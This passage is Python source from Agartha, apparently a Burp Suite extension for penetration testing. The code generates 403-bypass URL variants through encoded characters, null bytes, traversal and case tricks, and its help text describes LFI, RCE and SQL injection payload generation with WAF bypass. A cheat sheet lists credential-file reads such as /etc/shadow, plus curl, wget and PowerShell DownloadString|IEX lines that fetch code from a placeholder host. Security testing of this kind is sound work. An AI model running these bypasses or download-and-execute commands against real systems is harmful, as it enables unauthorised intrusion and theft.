                _replaceWiths = ["/./", "/%09/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            if urlparse.urlparse(_url).path.endswith("/") and _url.count('/') != 3:
                                _url = _url[: _locations[-1]] + _replaceWith + _url[_locations[-1]:]
                            else:
                                _url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _replaceWith[1:-1] + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                            _url = _url.replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                # column11


                # column12, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin?id=1/%09/
                #                           http://dvwa.local/company/%09/users/admin?id=1/%09/
                #                           http://dvwa.local/company/users/%09/admin?id=1/%09/
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _url = (_url + _replaceWith).replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                # column12



                # column13, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin?id=1%09
                #                           http://dvwa.local/company/%09/users/admin?id=1%09
                #                           http://dvwa.local/company/users/%09/admin?id=1%09
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _url = (_url + _replaceWith[1:-1]).replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                # column13


                # column14, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/users/admin.html?id=1
                _headerOrg = list(_matrixList[x][1])
                _fileExtensions = [".js", ";.js", ".html", ";.html", ".js%2f", ";.js%2f", ".html%2f", ";.html%2f", ";index.html", "%00.html", ";%00.html", "%00.js", ";%00.js"]
                for _url in _urls:
                    if len(urlparse.urlparse(_url).path) > 1:
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        for _fileExtension in _fileExtensions:
                            if urlparse.urlparse(_url).path.endswith("/"):
                                url = _url[: _locations[-1]] + _fileExtension + "/" + _url[_locations[-1] + 1:]
                            else:
                                url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _fileExtension + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                            if url not in _rowUrls:
                                _rowUrls.append(url)
                                _header = list(_headerOrg[1:])
                                _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                self._httpCalls =[]
                                _columnNum = _columnNum + 1
                                _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                _cellHint.append("Target URL is '" + url + "'")
                # column14


                # column15, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local//company//users//admin?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["//", "///", "////", "/////"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') == 3:
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            url = _url[: _locations[2]] + _replaceWith + _url[_locations[2] + 1:]
                        else:
                            url = _url.replace(urlparse.urlparse(_url).path, urlparse.urlparse(_url).path.replace("/", _replaceWith))
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("Target URL is '" + url + "'")
                # column15


                # column16, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/COMPANY/USERS/ADMIN?ID=1
                #                           http://dvwa.local/company/USERS/ADMIN?ID=1
                #                           http://dvwa.local/company/users/ADMIN?ID=1
                _headerOrg = list(_matrixList[x][1])
                for _url in _urls:
                    if _url.endswith('/'):
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                    else: 
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        _locations.append(len(_url))
                    for _location in _locations[2:-1]:
                        url = _url[:_location] + _url[_location:].upper()
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("Target URL is '" + url + "'")
                        url = _url[:_location] + _url[_location:].lower()
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("Target URL is '" + url + "'")
                # column16


                # column17, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/users/admin/?id=1
                _headerOrg = list(_matrixList[x][1])
                for _url in _urls:
                    if len(urlparse.urlparse(_url).path) > 1:
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        if urlparse.urlparse(_url).path.endswith("/"):
                            url = _url[: _locations[-1]] + _url[_locations[-1]:][1:]
                        else:
                            url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + "/" + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("Target URL is '" + url + "'")
                # column17



                # column18, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/../company/users/admin%00?id=1
                #                           http://dvwa.local/company/users/../users/admin%00?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWith =  "/../"
                for _url in _urls:
                    if _url.count('/') != 3:
                        if urlparse.urlparse(_url).path.endswith('/'):
                            _url = _url.replace(urlparse.urlparse(_url).path, urlparse.urlparse(_url).path[:-1] + "%00/")
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-2]
                        else: 
                            _url = _url.replace(urlparse.urlparse(_url).path, urlparse.urlparse(_url).path + "%00")
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-1]
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        path = _url[:_locations[2]]
                        for _path in _paths:
                            if _path:
                                path = path + "/" + _path
                                url = _url.replace(_url[: _locations[_url.count('/') - 1]], _url[: _locations[_url.count('/') - 1]])
                                url =  url.replace(path, path + _replaceWith + _path)
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                # column18


                # column19, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/../company/users/admin?id=1%00
                #                           http://dvwa.local/company/users/../users/admin?id=1%00
                _headerOrg = list(_matrixList[x][1])
                _replaceWith =  "/../"
                for _url in _urls:
                    if _url.count('/') != 3:
                        _url = _url + "%00"
                        if urlparse.urlparse(_url).path.endswith('/'):
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-2]
                        else: 
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-1]
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        path = _url[:_locations[2]]
                        for _path in _paths:
                            if _path:
                                path = path + "/" + _path
                                url = _url.replace(_url[: _locations[_url.count('/') - 1]], _url[: _locations[_url.count('/') - 1]])
                                url =  url.replace(path, path + _replaceWith + _path)
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                # column19


                self._httpReqResAuthentication.append(_reqRes)
                self._httpReqResAuthenticationTipMessage.append(_cellHint)


            self.currentText = "The table has been populated. Blank is default color, which indicates no issue has been found. Http response codes are shown below, you can click any of them for more details."
            if self.errorNumbers != 0:
                successRate = 100 - 100 * float(self.errorNumbers) / float(self.cellNumbers)
                if successRate > 69:
                    self.currentText = "Successful connection rate is " + str(int(successRate)) + "%"
                    self.currentText = self.currentText + ". The table has been populated. Blank is default color, which indicates no issue has been found. Http response codes are shown below, you can click any of them for more details."
                else:
                    self.currentText = "Successful connection rate is very low, please check your network connection!"
            
            self.progressBarAuthenticationPanel.setValue(1000000)
            self._btnAuthenticationFetchHistory.setEnabled(True)
            self._btnAuthenticationReset.setEnabled(True)
            self._cbAuthenticationHost.setEnabled(True)
            self._btnAuthenticationRun.setEnabled(True)
            self._cbAuthenticationEnableFilter.setEnabled(True)
            self._lblAuthenticationDaystoShow.setEnabled(True)
            self._cbAuthenticationDaystoShow.setEnabled(True)
            self._lblAuthenticationEnableURLGroup.setEnabled(True)
            self._cbAuthenticationEnableURLGroup.setEnabled(True)
            self._lblAuthenticationEnableFilter2.setEnabled(True)
            self._lblAuthenticationDaystoShow.setVisible(False)
            self._cbAuthenticationDaystoShow.setVisible(False)
            self.txAuthenticationEnableKeyWordURL.setEnabled(True)
            self._customRendererAuthentication =  UserEnabledRenderer(self.tableMatrixAuthentication.getDefaultRenderer(str), self._httpReqResAuthentication, self._httpReqResAuthenticationTipMessage)
            self._customTableColumnModelAuthentication = self.tableMatrixAuthentication.getColumnModel()

            _setPreferredWidth = (self.tableMatrixAuthentication.getWidth() - 400) / self.tableMatrixAuthentication.getColumnCount()
            if _setPreferredWidth < 40:
                _setPreferredWidth = 40
            for y in range(1, self.tableMatrixAuthentication.getColumnCount()):
                self._customTableColumnModelAuthentication.getColumn(y).setCellRenderer(self._customRendererAuthentication)
                self.tableMatrixAuthentication.getColumnModel().getColumn(y).setPreferredWidth(_setPreferredWidth)
            self._customTableColumnModelAuthentication.getColumn(0).setCellRenderer(self._customRendererAuthentication)
            self.tableMatrixAuthentication.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
            self.tableMatrixAuthentication.repaint()

            sleep(0.1)
            colors = ""
            if self._customRendererAuthentication._colorsRed:
                colors += "Red"
            if self._customRendererAuthentication._colorsOrange:
                if colors:
                    colors += ", Orange"
                else:
                    colors += "Orange"
            if self._customRendererAuthentication._colorsYellow:
                if colors:
                    colors += ", Yellow"
                else:
                    colors += "Yellow"
            
            if colors:
                if colors.count(",") >= 1:
                    colors += " colors show different level of possible access violations"
                else:
                    colors += " color shows possible access violations"

            if colors:
                self.currentText = self.currentText.replace("Blank is default color, which indicates no issue has been found.", colors +", however blank is default color, which indicates no issue has been found.")
            self._lblAuthenticationNotification.text = self.currentText

        except:
            print str(sys.exc_info()[1])

        return

    def urlFinder(self, path, url):
        if '..' in path:
            if (url.count('/') - 3) >= path.count('..'):
                return posixpath.normpath(url.rsplit('/',1)[0] + "/" + path).replace('http:/','http://')
            else:
                return url.split('/',3)[0] + "//" + url.split('/',3)[2] + "/" + path.rsplit('../',1)[1]
        elif path.startswith('http'):
            return path
        else:
            if path.startswith('/'):
                return url.split("/", 3)[0] + "//" + url.split("/", 3)[2] + path
            else:
                return url.split("/", 3)[0] + "//" + url.split("/", 3)[2] + "/" + path

    def _tabHelpUI(self):
        self._tabHelpJPanel = JPanel(BorderLayout())
        self._tabHelpJPanel.setBorder(EmptyBorder(10, 10, 10, 10))
        self.editorPaneInfo = JEditorPane()
        self.editorPaneInfo.setEditable(False)
        self.editorPaneInfo.setContentType("text/html")
        htmlString = "<html><body><table width=1000 border=0 cellspacing=0><tr><td><h3>Author:\t\t\tVolkan Dindar<br/>Github:\t\t\thttps://github.com/volkandindar/agartha</h3><br/>"
        htmlString += """
        <h1>Agartha</h1>
        <h4>Payload Injection (LFI, RCE, SQLi, with optional BCheck), Auth Issues (Access Matrix, HTTP 403), Copy as JavaScript, and Bambdas</h4>
        <hr/>
        <p>Agartha, specializes in advance payload generation and access control assessment. It adeptly identifies vulnerabilities related to injection attacks, and authentication/authorization issues. The dynamic payload generator crafts extensive wordlists for various injection vectors, including SQL Injection, Local File Inclusion (LFI), and Remote Code Execution(RCE). Furthermore, the extension constructs a comprehensive user access matrix, revealing potential access violations and privilege escalation paths. It also assists in performing HTTP 403 bypass checks, shedding light on auth misconfigurations. Additionally, it can convert HTTP requests to JavaScript code to help digging up XSS issues more.</p>
        <p></p>
        <p>In summary:</p>
        <ul>
        <li><strong>Payload Generator</strong>: It dynamically constructs comprehensive wordlists for injection attacks, incorporating various encoding and escaping characters to enhance the effectiveness of security testing. These wordlists cover critical vulnerabilities such as SQL Injection (SQLi), Local File Inclusion (LFI), Remote Code Execution (RCE), and now also support BCheck syntax for seamless integration with Burp&#39;s BCheck framework.<ul>
        <li><strong>Local File Inclusion, Path Traversal:</strong> It helps identifying vulnerabilities that allow attackers to access files on the server&#39;s filesystem.</li>
        <li><strong>Remote Code Execution, Command Injection:</strong> It aims to detects potential command injection points, enabling robust testing for code execution vulnerabilities.</li>
        <li><strong>SQL Injection:</strong> It assists to uncover SQL Injection vulnerabilities, including Stacked Queries, Boolean-Based, Union-Based, and Time-Based.</li>
        </ul>
        </li>
        <li><strong>Auth Matrix</strong>: By constructing a comprehensive access matrix, the tool reveals potential access violations and privilege escalation paths. This feature enhances security posture by addressing authentication and authorization issues. <ul>
        <li>You can use the web <strong>Spider</strong> feature to generate a sitemap/URL list, and it will crawl visible links from the user&#39;s session automatically.</li>
        </ul>
        </li>
        <p><li><strong>403 Bypass</strong>: It aims to tackle common access restrictions, such as HTTP 403 Forbidden responses. It utilizes techniques like URL manipulation and request header modification to bypass implemented limitations.</li></p>
        <p><li><strong>Copy as JavaScript</strong>: It converts Http requests to JavaScript code for further XSS exploitation and more.</li></p>
        <p><li><strong>Bambdas Script Generator</strong>: The feature supports automatic generation of Bambdas-compatible scripts based on user input. It eliminates the need for manual coding, enabling faster creation of custom scripts and streamlining integration with the Bambdas engine.</li></p>
        </ul>"""
        htmlString += "</td></tr></table></body></html>"
        
        self.editorPaneInfo.setText(htmlString)
        self.editorScrollPaneInfo = JScrollPane(self.editorPaneInfo)
        self.editorScrollPaneInfo.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS)

        #  Custom MouseWheelListener to slow down scroll
        class SlowScrollMouseWheelListener(MouseWheelListener):
            def mouseWheelMoved(inner_self, e):
                scrollBar = self.editorScrollPaneInfo.getVerticalScrollBar()
                amount = e.getUnitsToScroll() * 5  # scale value
                scrollBar.setValue(scrollBar.getValue() + amount)
                e.consume()  # prevent default fast scroll

        self.editorPaneInfo.addMouseWheelListener(SlowScrollMouseWheelListener())
        self._tabHelpJPanel.add(self.editorScrollPaneInfo, BorderLayout.CENTER)

    def _tabDictUI(self):
        # top panel
        self._txtDefaultLFI = "Example: '/etc/passwd', 'C:\\boot.ini'"
        self._txtDefaultCommandInj = "Examples: $'sleep 120', >'timeout 120' - for 2 minutes"
        self._txtDefaultSQLi = "No input is needed to supply!"
        self._txtCheatSheetLFI = ""
        self._txtCheatSheetLFI += "Common files for Linux\t\t\tCommon files for Windows\n"
        self._txtCheatSheetLFI += "\t/etc/passwd\t\t\tC:\\boot.ini\n"
        self._txtCheatSheetLFI += "\t/etc/profile\t\t\t\tC:\\windows\\win.ini\n"
        self._txtCheatSheetLFI += "\t/proc/self/environ\t\t\tC:\\windows\\system.ini\n"
        self._txtCheatSheetLFI += "\t/proc/self/status\t\t\tC:\\windows\\system32\\notepad.exe\n"
        self._txtCheatSheetLFI += "\t/etc/hosts\t\t\t\tC:\\windows\\system32\\drivers\\etc\\hosts\n"
        self._txtCheatSheetLFI += "\t/etc/shadow\t\t\tC:\\windows\\system32\\license.rtf\n"
        self._txtCheatSheetLFI += "\t/etc/group\t\t\t\tC:\\users\\public\\desktop\\desktop.ini\n"
        self._txtCheatSheetLFI += "\t/var/log/auth.log\t\t\tC:\\windows\\system32\\eula.txt\n"
        
        self._txtCheatSheetCommandInj = ""
        self._txtCheatSheetCommandInj += "Common commands for Unix\t\t\tCommon commands for Windows\n"
        self._txtCheatSheetCommandInj += "\tcat /etc/passwd\t\t\t\ttype file.txt\n"
        self._txtCheatSheetCommandInj += "\tuname -a\t\t\t\t\tsysteminfo\n"
        self._txtCheatSheetCommandInj += "\tid\t\t\t\t\twhoami /priv\n"
        self._txtCheatSheetCommandInj += "\tping -c 10 X.X.X.X\t\t\t\tping -n 10 X.X.X.X\n"
        self._txtCheatSheetCommandInj += "\tcurl http://X.X.X.X/file.txt -o /tmp/file.txt\t\tpowershell (new-object System.Net.WebClient).DownloadFile('http://X.X.X.X/file.txt','C:\\users\\public\\file.txt')\n"
        self._txtCheatSheetCommandInj += "\twget http://X.X.X.X/file.txt -O /tmp/file.txt\t\t(New-Object System.Net.WebClient).DownloadString('http://http://X.X.X.X/file.txt') | IEX\n"
        _lblDepth = JLabel("( Depth =", SwingConstants.LEFT)
        _lblDepth.setToolTipText("Generate payloads only for a specific depth.")
        _btnGenerateDict = JButton("Generate the Payloads", actionPerformed=self.funcGeneratePayload)
        _btnGenerateDict.setToolTipText("Click to generate payloads.")
        _btnGenerateDictForBCheck = JButton("Generate payloads for BCheck", actionPerformed=self.funcGeneratePayloadForBCheck)
        _btnGenerateDictForBCheck.setToolTipText("Generate payloads for BCheck.")
        self._lblStatusLabel = JLabel()
        self._lblStatusLabel.setText("Please provide a path for payload generation!")
        self._txtTargetPath = JTextField(self._txtDefaultLFI, 30)
        self._rbDictLFI = JRadioButton('LFI / PT', True, itemStateChanged=self.funcRBSelection)
        self._rbDictLFI.setToolTipText("Payload generation for Local File Inclusion, Path Traversal.")
        self._rbDictCommandInj = JRadioButton('Command Inj / RCE', itemStateChanged=self.funcRBSelection)
        self._rbDictCommandInj.setToolTipText("Payload generation for Command Injection, Remote Code Execution.")
        self._rbDictSQLi = JRadioButton('SQL Injection', itemStateChanged=self.funcRBSelection)
        self._rbDictSQLi.setToolTipText("Payload generation for various type of SQL attacks.")
        _rbDictCheatSheet = JRadioButton('Cheat Sheet', itemStateChanged=self.funcRBSelection)
        _rbDictFuzzer = JRadioButton('Fuzzer', itemStateChanged=self.funcRBSelection)
        _rbPanel = JPanel()
        _rbPanel.add(self._rbDictLFI)
        _rbPanel.add(self._rbDictCommandInj)
        _rbPanel.add(self._rbDictSQLi)
        _rbGroup = ButtonGroup()
        _rbGroup.add(self._rbDictLFI)
        _rbGroup.add(self._rbDictCommandInj)
        _rbGroup.add(self._rbDictSQLi)
        _rbGroup.add(_rbDictCheatSheet)
        _rbGroup.add(_rbDictFuzzer)
        self._cbDictWafBypass = JCheckBox('Waf Bypass', True)
        self._cbDictWafBypass.setToolTipText("It includes bypass techniques like null bytes, various type of encodings, different file extensions, etc.")
        self._cbDictEquality = JCheckBox(')', False)
        self._cbDictEquality.setToolTipText("Limit payload generation by specific directory depth.")
        self._cbDictDepth = JComboBox(list(range(0, 20)))
        self._cbDictDepth.setSelectedIndex(5)
        self._cbDictDepth.setToolTipText("Folder depth limit (how many parent levels to traverse).")
        _cbDictDepthPanel = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        _cbDictDepthPanel.add(self._cbDictDepth)
        self._cbDictCommandInjEncoding = JCheckBox('URL Encoding', False)
        self._cbDictCommandInjEncoding.setToolTipText("Encode the payload output.")
        self._cbDictCommandInjOpt = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._cbDictCommandInjOpt.add(self._cbDictCommandInjEncoding)
        self._cbDictCommandInjOpt.setVisible(False)
        self._cbStackedSQL = JCheckBox('Stacked Queries', False)
        self._cbStackedSQL.setToolTipText("Include stacked-query SQLi payloads.")
        self._cbTimeBased = JCheckBox('Time-Based', False)
        self._cbTimeBased.setToolTipText("Include time-based SQLi payloads.")
        self._cbUnionBased = JCheckBox('Union-Based', False, itemStateChanged=self._cbUnionBasedFunc)
        self._cbUnionBased.setToolTipText("Include UNION-based SQLi payloads.")
        self._cbUnionDepth = JComboBox(list(range(1, 20)))
        self._cbUnionDepth.setSelectedIndex(4)
        self._cbUnionDepth.setEnabled(False)
        self._cbUnionDepth.setToolTipText("Range of column counts to try for UNION-based SQLi.")
        self._cbBooleanBased = JCheckBox('Boolean-Based', True)
        self._cbBooleanBased.setToolTipText("Include boolean-based SQLi payloads.")
        self._cbMssqlBased = JCheckBox('MSSQL', True)
        self._cbMssqlBased.setToolTipText("Include Microsoft SQL Server syntax.")
        self._cbMysqlBased = JCheckBox('MYSQL', True)
        self._cbMysqlBased.setToolTipText("Include MySQL syntax.")
        self._cbPostgreBased = JCheckBox('POSTGRESQL', True)
        self._cbPostgreBased.setToolTipText("Include PostgreSQL syntax.")
        self._cbOracleBased = JCheckBox('ORACLE', True)
        self._cbOracleBased.setToolTipText("Include Oracle syntax.")
        self._cbSqlWafBypass = JCheckBox('Waf Bypass', True)
        self._cbSqlWafBypass.setToolTipText("Include common WAF-bypass tactics (null bytes, mixed encodings, etc.).")
        self._cbSqlEncoding = JCheckBox('URL Encoding', False)
        self._cbSqlEncoding.setToolTipText("Encode the payload output.")
        _tabDictPanel_1 = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabDictPanel_1.add(self._txtTargetPath, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(_btnGenerateDict, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(_btnGenerateDictForBCheck, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(_rbPanel, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_LFI.add(_lblDepth, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.add(self._cbDictEquality, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.add(_cbDictDepthPanel, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.add(self._cbDictWafBypass, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.setVisible(True)
        self._tabDictPanel_SQLType = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_SQLType.add(self._cbMysqlBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.add(self._cbPostgreBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.add(self._cbMssqlBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.add(self._cbOracleBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.setVisible(False)
        self._tabDictPanel_SQLOptions = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_SQLOptions.add(self._cbSqlEncoding, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLOptions.add(self._cbSqlWafBypass, BorderLayout.PAGE_START)        
        self._tabDictPanel_SQLOptions.setVisible(False)
        self._tabDictPanel_SQLi = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_SQLi.add(self._cbStackedSQL, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbBooleanBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbTimeBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbUnionBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbUnionDepth, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.setVisible(False)
        _tabDictPanel_1.add(self._tabDictPanel_LFI, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._cbDictCommandInjOpt, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._tabDictPanel_SQLType, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._tabDictPanel_SQLOptions, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._tabDictPanel_SQLi, BorderLayout.PAGE_START)
        _tabDictPanel_1.setPreferredSize(Dimension(400, 90))
        _tabDictPanel_1.setMinimumSize(Dimension(400, 90))
        # top panel

        # center panel
        _tabDictPanel_2 = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        _tabDictPanel_2.add(self._lblStatusLabel)
        # center panel
        
        # bottom panel 
        self._tabDictResultDisplay = JTextPane()
        self._tabDictResultDisplay.setContentType("text")
        self._tabDictResultDisplay.setText(self._txtCheatSheetLFI)
        self._tabDictResultDisplay.setEditable(False)
        self._tabDictResultDisplay.setToolTipText("The generated payloads will appear here.")
        _tabDictPanel_3 = JPanel(BorderLayout(10, 10))
        _tabDictPanel_3.setBorder(EmptyBorder(10, 0, 0, 0))
        _tabDictPanel_3.add(JScrollPane(self._tabDictResultDisplay), BorderLayout.CENTER)
        # bottom panel 

        self._tabDictPanel = JPanel()
        self._tabDictPanel.setLayout(BoxLayout(self._tabDictPanel, BoxLayout.Y_AXIS))
        self._tabDictPanel.add(_tabDictPanel_1)
        self._tabDictPanel.add(_tabDictPanel_2)
        self._tabDictPanel.add(_tabDictPanel_3)

    def tableMatrixReset(self, ev):
        self.tableMatrix = []        
        self.tableMatrix_DM = CustomDefaultTableModel(self.tableMatrix, ('URLs','No Authentication'))
        self.tableMatrix = JTable(self.tableMatrix_DM)
        self.tableMatrix_SP.getViewport().setView((self.tableMatrix))
        self.userCount = 0
        self.userNames = []
        self.userNames.append("No Authentication")
        self.userNamesHttpReq = []
        self.userNamesHttpReq.append("")
        self.userNamesHttpUrls = [[]]
        self.httpReqRes = [[],[],[],[],[]]
        self.httpReqRes.append([])
        self._requestViewer.setMessage("", False)
        self._responseViewer.setMessage("", False)
        self._lblAuthNotification.text = "Please add users to create an auth matrix!"
        self._lblAuthNotification.setForeground (Color.black)
        self._tbAuthNewUser.setForeground (Color.black)        
        self._txtHeaderDefault = "GET /example HTTP/1.1\nHost: localhost.com\nAccept-Encoding: gzip,deflate\nConnection: close\nCookie: SessionID=......"
        self._tbAuthHeader.setText(self._txtHeaderDefault)
        self._txtURLDefault = "http://localhost.com/example"
        self._tbAuthURL.setText(self._txtURLDefault)
        self._txtUserDefault = "User1"
